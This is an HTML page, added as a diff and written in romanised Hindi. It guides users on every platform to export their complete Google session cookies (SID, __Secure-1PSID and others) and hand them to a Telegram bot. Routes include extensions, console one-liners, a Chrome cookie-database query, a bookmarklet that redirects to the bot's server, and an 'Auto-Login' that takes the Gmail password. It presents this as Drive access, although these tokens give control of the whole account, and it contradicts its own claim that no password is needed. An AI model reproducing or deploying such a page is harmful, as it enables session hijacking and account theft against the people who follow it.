@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Cookies Guide — Every Device</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#060910;--surface:#0d1117;--surface2:#13181f;--surface3:#1a2030;
+  --border:rgba(99,102,241,.18);--purple:#6366f1;--green:#22d3a5;--green2:#10b981;
+  --red:#f87171;--yellow:#fbbf24;--orange:#fb923c;--blue:#60a5fa;
+  --text:#e2e8f0;--text2:#8892a4;--text3:#3d4a5c;
+}
+body{
+  font-family:-apple-system,'Inter','Segoe UI',sans-serif;
+  background:var(--bg);color:var(--text);min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;
+  padding:16px 12px 60px;
+  background-image:radial-gradient(ellipse 60% 40% at 15% 5%,rgba(99,102,241,.08) 0,transparent 70%),
+    radial-gradient(ellipse 50% 35% at 85% 95%,rgba(34,211,165,.06) 0,transparent 70%);
+}
+.page-wrap{max-width:560px;width:100%;}
+
+/* ── HEADER ── */
+.hdr{
+  background:linear-gradient(135deg,rgba(99,102,241,.12),rgba(34,211,165,.07));
+  border:1px solid var(--border);border-radius:20px;
+  padding:22px 20px 18px;margin-bottom:14px;text-align:center;
+}
+.hdr-icon{font-size:2.4rem;margin-bottom:8px;}
+.hdr h1{font-size:1.3rem;font-weight:800;color:#fff;margin-bottom:6px;}
+.hdr p{font-size:.84rem;color:var(--text2);line-height:1.6;}
+.auto-badge{
+  display:inline-flex;align-items:center;gap:6px;
+  background:rgba(34,211,165,.12);border:1px solid rgba(34,211,165,.25);
+  color:var(--green);border-radius:20px;padding:5px 14px;font-size:.78rem;font-weight:700;
+  margin-top:12px;cursor:pointer;text-decoration:none;
+}
+.auto-badge:hover{background:rgba(34,211,165,.2);}
+
+/* ── PLATFORM TABS ── */
+.tab-bar{
+  display:flex;gap:6px;flex-wrap:wrap;justify-content:center;
+  margin-bottom:14px;
+}
+.tab{
+  background:var(--surface);border:1px solid var(--border);
+  color:var(--text2);border-radius:12px;padding:8px 16px;
+  font-size:.82rem;font-weight:700;cursor:pointer;
+  transition:all .2s;flex-shrink:0;
+}
+.tab:hover{border-color:var(--purple);color:var(--text);}
+.tab.active{
+  background:rgba(99,102,241,.15);border-color:var(--purple);color:#fff;
+  box-shadow:0 0 0 1px rgba(99,102,241,.3);
+}
+
+/* ── METHOD CARD ── */
+.method-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:18px;padding:20px 18px;margin-bottom:12px;
+  position:relative;overflow:hidden;
+}
+.method-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--purple),var(--green));
+}
+.method-card.orange::before{background:linear-gradient(90deg,var(--orange),var(--yellow));}
+.method-card.blue::before{background:linear-gradient(90deg,var(--blue),var(--purple));}
+.method-card.red::before{background:linear-gradient(90deg,var(--red),var(--orange));}
+.method-card.gray::before{background:linear-gradient(90deg,#444,#666);}
+
+.badge{
+  display:inline-block;font-size:.68rem;font-weight:800;padding:3px 10px;
+  border-radius:20px;margin-bottom:12px;
+}
+.badge-best{background:#0d2a1a;color:#4cff91;border:1px solid #1e5c3a;}
+.badge-good{background:#1a2a00;color:#a3e635;border:1px solid #3a5c00;}
+.badge-ok{background:#2a1e00;color:var(--yellow);border:1px solid #5a3a00;}
+.badge-limited{background:#2a1400;color:var(--orange);border:1px solid #5a3000;}
+.badge-hard{background:#1e0a0a;color:var(--red);border:1px solid #5a1a1a;}
+
+.method-title{font-size:1rem;font-weight:800;color:#fff;margin-bottom:4px;}
+.method-sub{font-size:.8rem;color:var(--text2);margin-bottom:16px;line-height:1.5;}
+
+/* ── STEPS ── */
+.step{display:flex;gap:12px;align-items:flex-start;margin-bottom:14px;}
+.snum{
+  background:var(--purple);color:#fff;font-weight:800;
+  border-radius:50%;width:26px;height:26px;min-width:26px;
+  display:flex;align-items:center;justify-content:center;font-size:.8rem;flex-shrink:0;
+}
+.snum.g{background:var(--green2);}
+.snum.o{background:var(--orange);}
+.snum.b{background:var(--blue);}
+.sbody{flex:1;}
+.sbody strong{display:block;margin-bottom:4px;color:#fff;font-size:.9rem;}
+.sbody span,.sbody p{font-size:.82rem;color:var(--text2);line-height:1.65;}
+
+/* ── BUTTONS ── */
+.dl-btn{
+  display:inline-flex;align-items:center;gap:8px;
+  background:linear-gradient(135deg,rgba(99,102,241,.2),rgba(99,102,241,.08));
+  color:#fff;border:1px solid rgba(99,102,241,.3);border-radius:10px;
+  padding:10px 16px;font-size:.84rem;font-weight:700;
+  text-decoration:none;margin-top:8px;transition:all .2s;
+}
+.dl-btn:hover{background:rgba(99,102,241,.3);}
+.dl-btn.green{background:linear-gradient(135deg,rgba(34,211,165,.18),rgba(34,211,165,.06));border-color:rgba(34,211,165,.3);color:var(--green);}
+.dl-btn.green:hover{background:rgba(34,211,165,.25);}
+.dl-btn.orange{background:rgba(251,146,60,.1);border-color:rgba(251,146,60,.3);color:var(--orange);}
+
+/* ── CODE BOX ── */
+.code-box{
+  background:#0a0c10;border:1px solid rgba(255,255,255,.06);
+  border-radius:8px;padding:11px 13px;margin-top:8px;
+  font-family:'SF Mono',monospace;font-size:.79rem;color:#7cfc9e;
+  white-space:pre-wrap;word-break:break-all;position:relative;
+}
+.copy-row{display:flex;justify-content:flex-end;margin-top:6px;}
+.copy-btn{
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);
+  color:var(--text2);border-radius:6px;padding:4px 12px;font-size:.74rem;
+  cursor:pointer;transition:all .15s;
+}
+.copy-btn:hover{background:rgba(255,255,255,.12);color:#fff;}
+
+/* ── INFO / WARN ── */
+.info-box{
+  background:rgba(96,165,250,.06);border:1px solid rgba(96,165,250,.18);
+  border-radius:8px;padding:10px 13px;font-size:.8rem;color:var(--text2);
+  margin-top:10px;line-height:1.65;
+}
+.warn-box{
+  background:rgba(251,146,60,.06);border:1px solid rgba(251,146,60,.18);
+  border-radius:8px;padding:10px 13px;font-size:.8rem;color:#fbd38d;
+  margin-top:10px;line-height:1.65;
+}
+.success-box{
+  background:rgba(34,211,165,.06);border:1px solid rgba(34,211,165,.2);
+  border-radius:8px;padding:10px 13px;font-size:.8rem;color:var(--green);
+  margin-top:10px;line-height:1.65;
+}
+.divider{
+  text-align:center;color:var(--text3);font-size:.75rem;margin:18px 0;
+  display:flex;align-items:center;gap:10px;
+}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.06);}
+
+/* ── RESULT AREA ── */
+.result-area{display:none;margin-top:14px;}
+.result-area.show{display:block;}
+.result-area h4{color:var(--green);font-size:.88rem;margin-bottom:8px;}
+.result-area textarea{
+  width:100%;background:#0a0c10;border:1px solid rgba(34,211,165,.2);
+  border-radius:8px;color:var(--text2);font-family:monospace;font-size:.75rem;
+  padding:10px;resize:vertical;min-height:80px;outline:none;
+}
+.submit-btn{
+  width:100%;background:linear-gradient(135deg,var(--purple),#4f46e5);
+  color:#fff;border:none;border-radius:10px;padding:12px;
+  font-size:.92rem;font-weight:800;cursor:pointer;margin-top:10px;
+  transition:opacity .2s;
+}
+.submit-btn:hover{opacity:.88;}
+
+/* ── PLATFORM SECTIONS ── */
+.platform-section{display:none;}
+.platform-section.active{display:block;}
+
+/* ── NOTE ROW ── */
+.note-row{
+  display:flex;gap:8px;align-items:flex-start;
+  font-size:.79rem;color:var(--text2);line-height:1.6;margin-top:6px;
+}
+.note-row .icon{flex-shrink:0;font-size:.9rem;}
+code{
+  background:#1a1f2b;color:#93c5fd;padding:1px 6px;border-radius:4px;font-size:.82rem;
+}
+</style>
+</head>
+<body>
+<div class="page-wrap">
+
+<!-- ════════════════════ HEADER ════════════════════ -->
+<div class="hdr">
+  <div class="hdr-icon">🍪</div>
+  <h1>Google Drive Cookie Guide</h1>
+  <p>Bot ko Google Drive access dene ke liye cookies chahiye.<br>
+  Apna device choose karein — step-by-step guide milega, har device ke liye.</p>
+  <a class="auto-badge" href="javascript:window.history.back()">⚡ Auto-Login bhi available hai — zyada aasan!</a>
+</div>
+
+<!-- ════════════════════ WHAT / WHY INFO ════════════════════ -->
+<div class="method-card gray" style="margin-bottom:14px">
+  <span class="badge badge-ok">ℹ️ Cookies Kya Hain Aur Kyun Chahiye?</span>
+  <div class="method-title">Quick Samajh</div>
+  <p style="font-size:.82rem;color:var(--text2);line-height:1.7;margin-top:4px">
+    Jab aap <code>drive.google.com</code> pe login karte hain, browser ek "session cookie" save karta hai
+    jo batata hai ki aap logged-in hain. Bot ko yeh <b style="color:#fff">wahi cookie</b> chahiye taaki woh
+    aapke Drive account ki files aapki taraf se access kar sake — <b style="color:#fff">password kabhi nahi
+    chahiye hota, sirf cookie</b>.
+  </p>
+  <div class="info-box" style="margin-top:10px">
+    ✅ Zaroori cookies: <code>SID</code>, <code>HSID</code>, <code>SSID</code>, <code>APISID</code>,
+    <code>SAPISID</code>, <code>__Secure-1PSID</code>, <code>__Secure-3PSID</code> waghaira — isliye
+    <b style="color:#fff">poori cookie list</b> export karein, sirf ek do cookie kaafi nahi hoti.
+  </div>
+  <div class="warn-box" style="margin-top:8px">
+    ⚠️ <b>Incognito / Private mode mein login karke cookies mat nikalein</b> — woh session band hote hi expire ho jaati hain.
+    Normal (non-incognito) window mein login karke hi cookies export karein.
+  </div>
+</div>
+
+<!-- ════════════════════ PLATFORM TABS ════════════════════ -->
+<div class="tab-bar">
+  <button class="tab active" onclick="switchTab('win')">🖥️ Windows</button>
+  <button class="tab" onclick="switchTab('mac')">🍎 macOS</button>
+  <button class="tab" onclick="switchTab('linux')">🐧 Linux</button>
+  <button class="tab" onclick="switchTab('android')">🤖 Android</button>
+  <button class="tab" onclick="switchTab('ios')">🍏 iOS</button>
+</div>
+
+<!-- ════════════════════ WINDOWS ════════════════════ -->
+<div class="platform-section active" id="tab-win">
+
+  <!-- Method 1: J2Team -->
+  <div class="method-card">
+    <span class="badge badge-best">✅ Method 1 — Best (Sabse Aasaan)</span>
+    <div class="method-title">J2Team Cookies Extension</div>
+    <div class="method-sub">Chrome ya Edge mein ek click mein saari cookies (.json file) mil jaati hain — httpOnly cookies bhi!</div>
+
+    <div class="step">
+      <div class="snum g">1</div>
+      <div class="sbody">
+        <strong>Extension install karein</strong>
+        <p>Chrome Web Store se J2Team Cookies install karein.</p>
+        <a class="dl-btn green" href="https://chromewebstore.google.com/detail/j2team-cookies/okpidcojinmlaakglciglbpcpajaibco" target="_blank">
+          🔗 Install J2Team Cookies → Chrome Web Store
+        </a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">2</div>
+      <div class="sbody">
+        <strong>drive.google.com kholein aur apne account mein login karein</strong>
+        <a class="dl-btn green" href="https://drive.google.com" target="_blank">🔗 drive.google.com kholein</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">3</div>
+      <div class="sbody">
+        <strong>Extension se cookies export karein</strong>
+        <p>Browser toolbar mein <b style="color:#fff">J2Team icon</b> click karein → <b style="color:#fff">"Export Cookies"</b> dabao → <code>drive.google.com.json</code> file download ho jaayegi.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">4</div>
+      <div class="sbody">
+        <strong>Woh .json file Telegram bot ko bhejein</strong>
+        <p>Downloaded file ko bot ke chat mein <b style="color:#fff">document ke roop mein</b> send karein (as file, not photo).</p>
+      </div>
+    </div>
+    <div class="success-box">✅ Yeh method sabse reliable hai — private aur shared dono files access hogi.</div>
+  </div>
+
+  <div class="divider">YA — Doosra Tarika</div>
+
+  <!-- Method 2: EditThisCookie -->
+  <div class="method-card blue">
+    <span class="badge badge-good">👍 Method 2 — Bhi Acha</span>
+    <div class="method-title">EditThisCookie Extension</div>
+    <div class="method-sub">Chrome/Edge mein cookies JSON format mein copy karta hai.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>EditThisCookie install karein</strong>
+        <a class="dl-btn" href="https://chromewebstore.google.com/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank">🔗 Install EditThisCookie</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login karein, phir EditThisCookie icon click karein</strong>
+        <p>Export button (arrow icon) dabao — cookies clipboard mein copy ho jaayengi.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>Bot ko bhejein</strong>
+        <p>Telegram chat mein paste karein aur send karein.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider">YA — Advanced / Backup</div>
+
+  <!-- Method 3: DevTools -->
+  <div class="method-card orange">
+    <span class="badge badge-ok">⚠️ Method 3 — Limited Cookies</span>
+    <div class="method-title">DevTools Console (F12)</div>
+    <div class="method-sub">Sirf non-httpOnly cookies milti hain — private files ke liye kam ho sakta hai.</div>
+
+    <div class="step">
+      <div class="snum o">1</div>
+      <div class="sbody">
+        <strong>drive.google.com kholein, phir <code>F12</code> dabao</strong>
+        <p>DevTools panel khuljayega.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum o">2</div>
+      <div class="sbody">
+        <strong>Console tab pe click karein, yeh command paste karein:</strong>
+        <div class="code-box" id="cmd-win">copy(JSON.stringify(document.cookie.split('; ').reduce((a,c)=>{const[k,...v]=c.split('=');a[k]=v.join('=');return a},{}),null,2))</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-win',this)">📋 Copy Command</button></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum o">3</div>
+      <div class="sbody">
+        <strong>Enter dabao — cookies clipboard mein aa jaayengi</strong>
+        <p>Bot ke chat mein paste karein aur send karein.</p>
+      </div>
+    </div>
+    <div class="warn-box" style="border-color:rgba(251,146,60,.35)">⚠️ <b>Limitation:</b> <code>document.cookie</code> sirf <b>non-HttpOnly</b> cookies deta hai. Google Drive ke liye <code>__Secure-1PSID</code> aur <code>__Secure-3PSID</code> HttpOnly hain — JS se inaccessible. Private files ke liye Method 1 (J2Team) ya Auto-Login use karein.</div>
+  </div>
+
+  <!-- Manual cookie paste -->
+  <div class="method-card gray">
+    <span class="badge badge-ok">📋 Manually Paste Karein</span>
+    <div class="method-title">Cookie String Yahan Paste Karein</div>
+    <div class="method-sub">Agar koi method se cookies copy ho gayi hain to seedha yahan submit kar sakte hain.</div>
+    <div class="result-area show" id="win-paste-area">
+      <h4>📋 Cookie Paste Karein</h4>
+      <textarea id="win-cookie-input" placeholder="Yahan cookie string ya JSON paste karein..."></textarea>
+      <button class="submit-btn" onclick="submitCookies('win-cookie-input')">🚀 Submit to Bot</button>
+    </div>
+  </div>
+
+</div>
+
+<!-- ════════════════════ macOS ════════════════════ -->
+<div class="platform-section" id="tab-mac">
+
+  <div class="method-card">
+    <span class="badge badge-best">✅ Method 1 — Best</span>
+    <div class="method-title">J2Team Cookies (Chrome/Edge)</div>
+    <div class="method-sub">Windows jaisa hi process — Chrome ya Edge mein J2Team extension use karein.</div>
+
+    <div class="step">
+      <div class="snum g">1</div>
+      <div class="sbody">
+        <strong>J2Team Cookies install karein</strong>
+        <a class="dl-btn green" href="https://chromewebstore.google.com/detail/j2team-cookies/okpidcojinmlaakglciglbpcpajaibco" target="_blank">🔗 Install J2Team Cookies</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">2</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login karein → J2Team icon → Export Cookies</strong>
+        <p><code>drive.google.com.json</code> file download ho jaayegi.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">3</div>
+      <div class="sbody">
+        <strong>Woh .json file bot ko document ke roop mein bhejein</strong>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider">YA — Safari Users</div>
+
+  <div class="method-card blue">
+    <span class="badge badge-good">🧭 Safari — Web Inspector</span>
+    <div class="method-title">Safari DevTools (macOS)</div>
+    <div class="method-sub">Safari mein Develop menu enable karein aur cookies nikaalein.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>Safari → Preferences → Advanced → "Show Develop menu" enable karein</strong>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>drive.google.com kholein</strong>
+        <p>Menu bar mein <b style="color:#fff">Develop → Show Web Inspector</b> click karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>Console tab mein yeh command paste karein:</strong>
+        <div class="code-box" id="cmd-safari">copy(document.cookie)</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-safari',this)">📋 Copy</button></div>
+        <p style="margin-top:6px">Cookies clipboard mein aa jaayengi — bot ko paste karein.</p>
+      </div>
+    </div>
+    <div class="warn-box" style="border-color:rgba(251,146,60,.35)">⚠️ <b>Limitation:</b> <code>document.cookie</code> sirf <b>non-HttpOnly</b> cookies deta hai. Google Drive ke liye zaroori <code>__Secure-1PSID</code> HttpOnly hai — JS se nahi milega. Private files ke liye Chrome + J2Team extension ya Auto-Login use karein.</div>
+  </div>
+
+</div>
+
+<!-- ════════════════════ LINUX ════════════════════ -->
+<div class="platform-section" id="tab-linux">
+
+  <div class="method-card">
+    <span class="badge badge-best">✅ Method 1 — Best</span>
+    <div class="method-title">J2Team Cookies (Chrome/Chromium)</div>
+    <div class="method-sub">Linux mein Chrome ya Chromium install ho to J2Team extension use karein.</div>
+
+    <div class="step">
+      <div class="snum g">1</div>
+      <div class="sbody">
+        <strong>Google Chrome ya Chromium install karein (agar nahi hai)</strong>
+        <div class="code-box" id="cmd-linux-chrome">sudo apt install chromium-browser  # Ubuntu/Debian
+sudo dnf install chromium          # Fedora
+sudo pacman -S chromium            # Arch</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-linux-chrome',this)">📋 Copy</button></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">2</div>
+      <div class="sbody">
+        <strong>J2Team Cookies extension install karein</strong>
+        <a class="dl-btn green" href="https://chromewebstore.google.com/detail/j2team-cookies/okpidcojinmlaakglciglbpcpajaibco" target="_blank">🔗 Install J2Team Cookies</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">3</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login → J2Team → Export → .json file bot ko bhejein</strong>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider">YA — Firefox Users</div>
+
+  <div class="method-card blue">
+    <span class="badge badge-good">🦊 Firefox + Cookie Quick Manager</span>
+    <div class="method-title">Firefox Extension Method</div>
+    <div class="method-sub">Firefox mein Cookie Quick Manager se saari cookies export kar sakte hain.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>Cookie Quick Manager install karein</strong>
+        <a class="dl-btn" href="https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/" target="_blank">🔗 Install Cookie Quick Manager (Firefox)</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login karein</strong>
+        <p>Extension icon click karein → <b style="color:#fff">Export all cookies for this domain</b> → JSON format choose karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>Exported file bot ko document ke roop mein bhejein</strong>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider">YA — Terminal Method (Advanced)</div>
+
+  <div class="method-card orange">
+    <span class="badge badge-ok">⚙️ Advanced — Terminal</span>
+    <div class="method-title">SQLite Cookie Extraction</div>
+    <div class="method-sub">Chrome cookie database se directly cookies nikaalein (encrypted nahi hoti Linux pe).</div>
+    <div class="step">
+      <div class="snum o">1</div>
+      <div class="sbody">
+        <strong>Terminal mein yeh command run karein:</strong>
+        <div class="code-box" id="cmd-linux-sqlite">sqlite3 ~/.config/google-chrome/Default/Cookies \
+  "SELECT name, value FROM cookies WHERE host_key LIKE '%google.com%';"</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-linux-sqlite',this)">📋 Copy</button></div>
+        <p style="margin-top:6px">Chromium ke liye: <code>~/.config/chromium/Default/Cookies</code></p>
+      </div>
+    </div>
+    <div class="warn-box">⚠️ Chrome band hona chahiye — warna DB locked rahega. Modern Chrome encrypted cookies save karta hai jo is method se nahi milenge.</div>
+  </div>
+
+</div>
+
+<!-- ════════════════════ ANDROID ════════════════════ -->
+<div class="platform-section" id="tab-android">
+
+  <div class="method-card">
+    <span class="badge badge-best">✅ Method 1 — Best for Android</span>
+    <div class="method-title">Kiwi Browser + J2Team Extension</div>
+    <div class="method-sub">Kiwi Browser Chromium-based hai aur Chrome extensions support karta hai — sirf Android pe yeh available hai!</div>
+
+    <div class="step">
+      <div class="snum g">1</div>
+      <div class="sbody">
+        <strong>Kiwi Browser install karein (Play Store)</strong>
+        <a class="dl-btn green" href="https://play.google.com/store/apps/details?id=com.kiwibrowser.browser" target="_blank">📲 Play Store — Kiwi Browser</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">2</div>
+      <div class="sbody">
+        <strong>Kiwi mein J2Team Cookies install karein</strong>
+        <p>Kiwi Browser kholein → address bar mein yeh URL type karein:</p>
+        <div class="code-box" id="j2-url">https://chromewebstore.google.com/detail/j2team-cookies/okpidcojinmlaakglciglbpcpajaibco</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('j2-url',this)">📋 Copy URL</button></div>
+        <p style="margin-top:6px">"Add to Chrome" pe tap karein → extension install ho jaayega.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">3</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login karein</strong>
+        <p>Kiwi mein ⋮ menu → Extensions → J2Team icon tap karein → <b style="color:#fff">Export Cookies</b>.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum g">4</div>
+      <div class="sbody">
+        <strong>Downloaded .json file Telegram bot ko document ke roop mein bhejein</strong>
+        <p>Telegram mein → Attach → File → <code>drive.google.com.json</code> select karein.</p>
+      </div>
+    </div>
+    <div class="success-box">✅ Android ke liye yeh best method hai — J2Team ke saath httpOnly cookies bhi milti hain.</div>
+  </div>
+
+  <div class="divider">YA — Firefox Mobile</div>
+
+  <div class="method-card blue">
+    <span class="badge badge-good">🦊 Method 2 — Firefox + Extension</span>
+    <div class="method-title">Firefox Android + Cookie Quick Manager</div>
+    <div class="method-sub">Firefox for Android extensions support karta hai.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>Firefox for Android install karein</strong>
+        <a class="dl-btn" href="https://play.google.com/store/apps/details?id=org.mozilla.firefox" target="_blank">📲 Play Store — Firefox</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>Cookie Quick Manager extension install karein</strong>
+        <p>Firefox mein ⋮ → Add-ons → Extensions → search "Cookie Quick Manager".</p>
+        <a class="dl-btn" href="https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/" target="_blank">🔗 Cookie Quick Manager</a>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>drive.google.com pe login karein → extension se cookies export karein</strong>
+        <p>⋮ → Extensions → Cookie Quick Manager → Export for this domain → JSON format.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">4</div>
+      <div class="sbody">
+        <strong>Exported file bot ko document mein bhejein</strong>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider">YA — PC Ke Saath (Bina Root Ke)</div>
+
+  <div class="method-card blue">
+    <span class="badge badge-good">💻 Method 3 — Chrome Remote Debugging (PC Zaroori)</span>
+    <div class="method-title">USB Debugging se Cookies Nikaalein</div>
+    <div class="method-sub">Agar koi Windows/Mac/Linux PC available ho to bina extra app install kiye seedha Chrome DevTools se cookies mil jaati hain.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>Phone mein Developer Options + USB Debugging on karein</strong>
+        <p><b style="color:#fff">Settings → About Phone</b> → "Build Number" pe 7 baar tap karein (Developer Options unlock hoga) → <b style="color:#fff">Settings → Developer Options → USB Debugging</b> ON karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>Phone ko PC se USB cable se connect karein</strong>
+        <p>Phone pe "Allow USB Debugging?" popup aayega → Allow tap karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>Phone ke Chrome mein drive.google.com kholein aur login karein</strong>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">4</div>
+      <div class="sbody">
+        <strong>PC ke Chrome mein yeh address kholein:</strong>
+        <div class="code-box" id="cmd-android-inspect">chrome://inspect#devices</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-android-inspect',this)">📋 Copy</button></div>
+        <p style="margin-top:6px">Apna phone aur drive.google.com tab dikhega → uske neeche <b style="color:#fff">"inspect"</b> link click karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">5</div>
+      <div class="sbody">
+        <strong>Naya DevTools window khulega (phone ki screen mirror hoke)</strong>
+        <p><b style="color:#fff">Console</b> tab pe click karein, phir Windows tab wala yeh command paste karein aur Enter dabao:</p>
+        <div class="code-box" id="cmd-android-remote">copy(JSON.stringify(document.cookie.split('; ').reduce((a,c)=>{const[k,...v]=c.split('=');a[k]=v.join('=');return a},{}),null,2))</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-android-remote',this)">📋 Copy Command</button></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">6</div>
+      <div class="sbody">
+        <strong>Cookies PC ki clipboard mein aa jaayengi</strong>
+        <p>PC pe kahin bhi (ya Telegram Web pe) paste karke bot ko bhejein.</p>
+      </div>
+    </div>
+    <div class="warn-box">⚠️ Sirf non-httpOnly cookies milti hain. Private files ke liye Method 1 (Kiwi + J2Team) ya Auto-Login use karein.</div>
+  </div>
+
+  <div class="divider">YA — Desktop Mode Trick</div>
+
+  <div class="method-card orange">
+    <span class="badge badge-ok">💡 Method 3 — Desktop Mode Bookmarklet</span>
+    <div class="method-title">Chrome Desktop Mode + Bookmarklet</div>
+    <div class="method-sub">Chrome Android mein Desktop Mode on karein aur bookmarklet se cookies nikaalein.</div>
+
+    <div class="step">
+      <div class="snum o">1</div>
+      <div class="sbody">
+        <strong>Chrome Android mein drive.google.com kholein</strong>
+        <p>⋮ → <b style="color:#fff">Desktop site</b> enable karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum o">2</div>
+      <div class="sbody">
+        <strong>Address bar mein yeh paste karein aur Enter dabao:</strong>
+        <div class="code-box bm-code" id="cmd-android-bm">javascript:(function(){/* loading... */})()</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-android-bm',this)">📋 Copy</button></div>
+        <p style="margin-top:6px">Page automatically bot ke server pe redirect ho jaayega — cookies copy-paste ki zarurat nahi!</p>
+      </div>
+    </div>
+    <div class="warn-box" style="border-color:rgba(251,146,60,.35)">⚠️ <b>Important:</b> JavaScript sirf <b>non-HttpOnly</b> cookies de sakta hai. Google Drive ke liye <code>__Secure-1PSID</code> aur <code>__Secure-3PSID</code> bhi chahiye jo HttpOnly hain — JS se inaccessible hain. Private files ke liye Method 1 (Kiwi + J2Team) ya Auto-Login use karein.</div>
+  </div>
+
+</div>
+
+<!-- ════════════════════ iOS ════════════════════ -->
+<div class="platform-section" id="tab-ios">
+
+  <div class="method-card red">
+    <span class="badge badge-hard">⚠️ iOS Pe Seedha Cookie Export Mushkil Hai</span>
+    <div class="method-title">iOS — Recommended Alternative</div>
+    <div class="method-sub">iOS mein browsers extensions support nahi karte. Neeche ke options try karein.</div>
+    <div class="info-box">
+      💡 <b style="color:#fff">Sabse Aasan:</b> Auto-Login feature use karein — Gmail + password daalein, bot khud login karke cookies save kar lega. Cookie manually nikaalana zarurat nahi padta!
+    </div>
+  </div>
+
+  <div class="divider">YA — Mac ke saath iPhone</div>
+
+  <div class="method-card blue">
+    <span class="badge badge-limited">🔗 Method 1 — Mac Required</span>
+    <div class="method-title">Safari Web Inspector via Mac</div>
+    <div class="method-sub">iPhone ko Mac se connect karke Safari DevTools se cookies nikaal sakte hain.</div>
+
+    <div class="step">
+      <div class="snum b">1</div>
+      <div class="sbody">
+        <strong>iPhone pe Web Inspector enable karein</strong>
+        <p><b style="color:#fff">Settings</b> → <b style="color:#fff">Safari</b> → <b style="color:#fff">Advanced</b> → <b style="color:#fff">Web Inspector</b> ON karein.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">2</div>
+      <div class="sbody">
+        <strong>iPhone ko Mac se USB cable se connect karein</strong>
+        <p>Mac pe Safari kholein → menu bar mein <b style="color:#fff">Develop</b> menu → apne iPhone ka naam dikhega.</p>
+        <div class="info-box" style="margin-top:8px">📌 Mac Safari mein Develop menu: Safari → Preferences → Advanced → "Show Develop menu" enable karein.</div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">3</div>
+      <div class="sbody">
+        <strong>iPhone Safari mein drive.google.com kholein aur login karein</strong>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum b">4</div>
+      <div class="sbody">
+        <strong>Mac Safari → Develop → [Your iPhone] → drive.google.com</strong>
+        <p>Web Inspector khulega → <b style="color:#fff">Console</b> tab → yeh type karein:</p>
+        <div class="code-box" id="cmd-ios-safari">document.cookie</div>
